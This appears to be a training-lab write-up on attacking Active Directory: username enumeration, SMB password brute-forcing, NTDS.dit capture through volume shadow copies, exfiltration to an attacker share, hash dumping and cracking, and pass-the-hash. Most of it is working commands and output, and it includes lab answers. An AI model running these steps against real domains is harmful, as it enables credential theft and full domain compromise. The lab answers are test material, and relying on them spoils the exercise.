# Attacking Active Directory and NTDS.dit

### Dictionary attacks against AD accounts using NetExec

| Username convention                 | Practical example for `Jane Jill Doe` |
| ----------------------------------- | ------------------------------------- |
| `firstinitiallastname`              | jdoe                                  |
| `firstinitialmiddleinitiallastname` | jjdoe                                 |
| `firstnamelastname`                 | janedoe                               |
| `firstname.lastname`                | jane.doe                              |
| `lastname.firstname`                | doe.jane                              |
| `nickname`                          | doedoehacksstuff                      |

Often, an email address's structure will give us the employee's username (structure: `username@domain`). For example, from the email address `jdoe`@`inlanefreight.com`, we can infer that `jdoe` is the username.

### **Creating a custom list of usernames**

Let's say we have done our research and gathered a list of names based on publicly available information. We will keep the list relatively short for the sake of this lesson because organizations can have a huge number of employees. Example list of names:

* Ben Williamson
* Bob Burgerstien
* Jim Stevenson
* Jill Johnson
* Jane Doe

We can create a custom list on our attack host using the names above. We can use a command line-based text editor like `Vim` or a graphical text editor to create our list. Our list may look something like this:

```shell-session
eldeim@htb[/htb]$ cat usernames.txt

bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```

Of course, this is just an example and doesn't include all of the names, but notice how we can include a different naming convention for each name if we do not already know the naming convention used by the target organization.

We can manually create our list(s) or use an `automated list generator` such as the Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats. Once the tool has been cloned to our local attack host using `Git`, we can run it against a list of real names as shown in the example output below:

```shell-session
eldeim@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 

ben
benwilliamson
ben.williamson
benwilli
benwill
benw
```

## **Enumerating valid usernames with Kerbrute**

In this example, NetExec is using SMB to attempt to logon as user (`-u`) `bwilliamson` using a password (`-p`) list containing a list of commonly used passwords (`/usr/share/wordlists/fasttrack.txt`). If the admins configured an account lockout policy, this attack could lock out the account that we are targeting. At the time of this writing (January 2022), an account lockout policy is not enforced by default with the default group policies that apply to a Windows domain, meaning it is possible that we will come across environments vulnerable to this exact attack we are practicing.

```shell-session
eldeim@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

SMB         10.129.201.57     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! 
```

Once we have our list(s) prepared or discover the naming convention and some employee names, we can launch a brute-force attack against the target domain controller using a tool such as NetExec. We can use it in conjunction with the SMB protocol to send logon requests to the target Domain Controller. Here is the command to do so:

### **Launching a brute-force attack with NetExec**

```shell-session
eldeim@htb[/htb]$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/25/25 - Ronnie Flathers @ropnop

2025/04/25 09:17:10 >  Using KDC(s):
2025/04/25 09:17:10 >   10.129.201.57:88

2025/04/25 09:17:11 >  [+] VALID USERNAME:       bwilliamson@inlanefreight.local
<SNIP>
```

#### **Event logs from the attack**

<figure><img src="../../../../.gitbook/assets/image (504).png" alt=""><figcaption></figcaption></figure>

On any Windows operating system, an admin can navigate to `Event Viewer` and view the Security events to see the exact actions that were logged.&#x20;

## Capturing NTDS.dit

`NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources. Recall that `NTDS.dit` file is stored at `%systemroot%/ntds` on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model). The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html). This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain similar to the technique we covered in this module's `Attacking SAM, SYSTEM, and SECURITY` section. As we practice this technique, consider the importance of protecting AD and brainstorm a few ways to stop this attack from happening.

### **Connecting to a DC with Evil-WinRM**

We can connect to a target DC using the credentials we captured.

&#x20; Attacking Active Directory and NTDS.dit

```shell-session
eldeim@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.

### **Checking local group membership**

Once connected, we can check to see what privileges `bwilliamson` has. We can start with looking at the local group membership using the command:

```shell-session
*Evil-WinRM* PS C:\> net localgroup

Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```

We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (`Administrators group`) or Domain Admin (`Domain Admins group`) (or equivalent) rights. We also will want to check what domain privileges we have.

### **Checking user account privileges including domain**

```shell-session
*Evil-WinRM* PS C:\> net user bwilliamson

User name                    bwilliamson
Full Name                    Ben Williamson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 12:48:58 PM
Password expires             Never
Password changeable          1/14/2022 12:48:58 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/14/2022 2:07:49 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
```

This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.

## **Creating shadow copy of C:**

We can use `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) of the `C:` drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on `C:` as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down. VSS is used by many different backup and disaster recovery software to perform operations.

```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

### **Copying NTDS.dit from the VSS**

We can then copy the `NTDS.dit` file from the volume shadow copy of `C:` onto another location on the drive to prepare to move NTDS.dit to our attack host.

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

        1 file(s) copied.
```

Before copying `NTDS.dit` to our attack host, we may want to use the technique we learned earlier to create an SMB share on our attack host. Feel free to go back to the `Attacking SAM, SYSTEM, and SECURITY` section to review that method if needed.

> Note: As was the case with `SAM`, the hashes stored in `NTDS.dit` are encrypted with a key stored in `SYSTEM`. In order to successfully extract the hashes, one must download both files.

## **Transferring NTDS.dit to attack host**

Now `cmd.exe /c move` can be used to move the file from the target DC to the share on our attack host.

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

        1 file(s) moved.		
```

### **Extracting hashes from NTDS.dit**

With a copy of `NTDS.dit` on our attack host, we can go ahead and dump the hashes. One way to do this is with Impacket's `secretsdump`:

```shell-session
eldeim@htb[/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 086ab260718494c3a503c47d430a92a4
[*] Reading and decrypting hashes from NTDS.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
<SNIP>
```

**A faster method: Using NetExec to capture NTDS.dit**

Alternatively, we may benefit from using NetExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.

```shell-session
eldeim@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil

SMB         10.129.201.57   445     DC01         [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57   445     DC01         [+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)
NTDSUTIL    10.129.201.57   445     DC01         [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\174556000
NTDSUTIL    10.129.201.57   445     DC01         Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.201.57   445     DC01         [+] NTDS.dit dumped to C:\Windows\Temp\174556000
NTDSUTIL    10.129.201.57   445     DC01         [*] Copying NTDS dump to /tmp/tmpcw5zqy5r
NTDSUTIL    10.129.201.57   445     DC01         [*] NTDS dump copied to /tmp/tmpcw5zqy5r
NTDSUTIL    10.129.201.57   445     DC01         [+] Deleted C:\Windows\Temp\174556000 remote dump directory
NTDSUTIL    10.129.201.57   445     DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.201.57   445     DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
NTDSUTIL    10.129.201.57   445     DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
NTDSUTIL    10.129.201.57   445     DC01         DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-IAUBULPG5MZ:1105:aad3b435b51404eeaad3b435b51404ee:4f3c625b54aa03e471691f124d5bf1cd:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-NKHHJGP3SMT:1106:aad3b435b51404eeaad3b435b51404ee:a74cc84578c16a6f81ec90765d5eb95f:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-K5E9CWYEG7Z:1107:aad3b435b51404eeaad3b435b51404ee:ec209bfad5c41f919994a45ed10e0f5c:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-5MG4NRVHF2W:1108:aad3b435b51404eeaad3b435b51404ee:7ede00664356820f2fc9bf10f4d62400:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-UISCTR0XLKW:1109:aad3b435b51404eeaad3b435b51404ee:cad1b8b25578ee07a7afaf5647e558ee:::
NTDSUTIL    10.129.201.57   445     DC01         WIN-ETN7BWMPGXD:1110:aad3b435b51404eeaad3b435b51404ee:edec0ceb606cf2e35ce4f56039e9d8e7:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\bwilliamson:1125:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\bburgerstien:1126:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jstevenson:1131:aad3b435b51404eeaad3b435b51404ee:bc007082d32777855e253fd4defe70ee:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jjohnson:1133:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jdoe:1134:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
NTDSUTIL    10.129.201.57   445     DC01         Administrator:aes256-cts-hmac-sha1-96:cc01f5150bb4a7dda80f30fbe0ac00bed09a413243c05d6934bbddf1302bc552
NTDSUTIL    10.129.201.57   445     DC01         Administrator:aes128-cts-hmac-sha1-96:bd99b6a46a85118cf2a0df1c4f5106fb
NTDSUTIL    10.129.201.57   445     DC01         Administrator:des-cbc-md5:618c1c5ef780cde3
NTDSUTIL    10.129.201.57   445     DC01         DC01$:aes256-cts-hmac-sha1-96:113ffdc64531d054a37df36a07ad7c533723247c4dbe84322341adbd71fe93a9
NTDSUTIL    10.129.201.57   445     DC01         DC01$:aes128-cts-hmac-sha1-96:ea10ef59d9ec03a4162605d7306cc78d
NTDSUTIL    10.129.201.57   445     DC01         DC01$:des-cbc-md5:a2852362e50eae92
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:aes256-cts-hmac-sha1-96:1eb8d5a94ae5ce2f2d179b9bfe6a78a321d4d0c6ecca8efcac4f4e8932cc78e9
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:aes128-cts-hmac-sha1-96:1fe3f211d383564574609eda482b1fa9
NTDSUTIL    10.129.201.57   445     DC01         krbtgt:des-cbc-md5:9bd5017fdcea8fae
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:aes256-cts-hmac-sha1-96:4b0618f08b2ff49f07487cf9899f2f7519db9676353052a61c2e8b1dfde6b213
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:aes128-cts-hmac-sha1-96:d2377357d473a5309505bfa994158263
NTDSUTIL    10.129.201.57   445     DC01         inlanefrieght.local\jim:des-cbc-md5:79ab08755b32dfb6
NTDSUTIL    10.129.201.57   445     DC01         WIN-IAUBULPG5MZ:aes256-cts-hmac-sha1-96:881e693019c35017930f7727cad19c00dd5e0cfbc33fd6ae73f45c117caca46d
NTDSUTIL    10.129.201.57   445     DC01         WIN-IAUBULPG5MZ:aes128-cts-hmac-sha1-
NTDSUTIL    10.129.201.57   445     DC01         [+] Dumped 61 NTDS hashes to /home/bob/.nxc/logs/DC01_10.129.201.57_2025-04-25_084640.ntds of which 15 were added to the database
NTDSUTIL    10.129.201.57   445    DC01          [*] To extract only enabled accounts from the output file, run the following command: 
NTDSUTIL    10.129.201.57   445    DC01          [*] grep -iv disabled /home/bob/.nxc/logs/DC01_10.129.201.57_2025-04-25_084640.ntds | cut -d ':' -f1
```

### **Cracking a single hash with Hashcat**

```shell-session
eldeim@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

In many of the techniques we have covered so far, we have had success in cracking hashes we've obtained.

`What if we are unsuccessful in cracking a hash?`

### Pass the Hash (PtH) considerations

We can still use hashes to attempt to authenticate with a system using a type of attack called `Pass-the-Hash` (`PtH`). A PtH attack takes advantage of the [NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm) to authenticate a user using a password hash. Instead of `username`:`clear-text password` as the format for login, we can instead use `username`:`password hash`. Here is an example of how this would work:

### **Pass the Hash (PtH) with Evil-WinRM Example**

```shell-session
eldeim@htb[/htb]$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

We can attempt to use this attack when needing to move laterally across a network after the initial compromise of a target. More on PtH will be covered in the module `AD Enumeration and Attacks`.

***

### Lab - Questions

* What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: \*\***.**\*)

`NTDS.dit`

* Submit the NT hash associated with the Administrator user from the example output in the section reading.

`64f12cddaa88057e06a81b54e73b949b`

* On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)

**Info -> People;** John Marston IT Director |  Carol Johnson Financial Controller | Jennifer Stapleton Logistics Manager

Fristly, save into a file the three names obtanided -->

```
nano names-in.txt

John Marston IT Director
Carol Johnson Financial Controller
Jennifer Stapleton Logistics Manager
```

Before that, git clone the user anarquie repositori and generame usernames -->

```
./username-anarchy -i names-im.txt > names-in-usernames.txt
```

<figure><img src="../../../../.gitbook/assets/image (18) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Once we have it, try to bruteforce via SMB and using rocku to password diccitionarie -->

```
nxc smb 10.129.202.85 -u names-in-usernames.txt -p /usr/share/wordlists/fasttrack.txt
```

> Take a long time

So... try using use kerbrute to know the specific username -->

> Gitclone the kerbrute repo and do 'male all'

```
./dist/kerbrute_linux_amd64 userenum --dc 10.129.202.85 --domain ILF.local names-in-usernames.txt


    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 11/26/25 - Ronnie Flathers @ropnop

2025/11/26 16:57:14 >  Using KDC(s):
2025/11/26 16:57:14 >  	10.129.202.85:88

2025/11/26 16:57:14 >  [+] VALID USERNAME:	 jmarston@ILF.local
2025/11/26 16:57:14 >  [+] VALID USERNAME:	 cjohnson@ILF.local
2025/11/26 16:57:14 >  [+] VALID USERNAME:	 jstapleton@ILF.local
2025/11/26 16:57:14 >  Done! Tested 43 usernames (3 valid) in 0.216 seconds

```

Once we know the real user, try to bruteforce smb -->

```
nxc smb 10.129.202.85 -u jmarston -p /usr/share/wordlists/fasttrack.txt
```

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)

We know see that jmarston is the admin of this pc, so... we connect via winrm to it -->

```
evil-winrm -i 10.129.202.85  -u jmarston -p 'P@ssword!'
```

Now I’ll check the local group membership to check if I have `Administrator` privileges:

```
net localgroup

[redacted]
*Administrators
```

Yes I have, so I’ll also check my Domain Privileges:

```
net user jmarston 

[redacted]
Global Group memberships     *Domain Admins        *Domain Users                             *Leadership
```

As I also have them, I will now try to capture the `NTDS.dit` using **netexec** (FAST way)

```
netexec smb 10.129.202.85 -u jmarston -p P@ssword! -M ntdsutil

SMB         10.129.202.85   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
SMB         10.129.202.85   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\176419940
NTDSUTIL    10.129.202.85   445    ILF-DC01         Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.202.85   445    ILF-DC01         [+] NTDS.dit dumped to C:\Windows\Temp\176419940
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] Copying NTDS dump to /tmp/tmpivrdihog
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] NTDS dump copied to /tmp/tmpivrdihog
NTDSUTIL    10.129.202.85   445    ILF-DC01         [+] Deleted C:\Windows\Temp\176419940 remote dump directory
NTDSUTIL    10.129.202.85   445    ILF-DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.202.85   445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:8ae8a4652370cea1d513f65d76cfc604:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         [+] Dumped 9 NTDS hashes to /home/htb-ac-489480/.nxc/logs/ILF-DC01_10.129.202.85_2025-11-26_172316.ntds of which 7 were added to the database
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] To extract only enabled accounts from the output file, run the following command: 
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] grep -iv disabled /home/htb-ac-489480/.nxc/logs/ILF-DC01_10.129.202.85_2025-11-26_172316.ntds | cut -d ':' -f1

```

We need get the password of `ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::` so.... get the NT hash and crack it --->

`92fd67fd2f49d0e83744aa82363f021b`

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  --format=NT
```
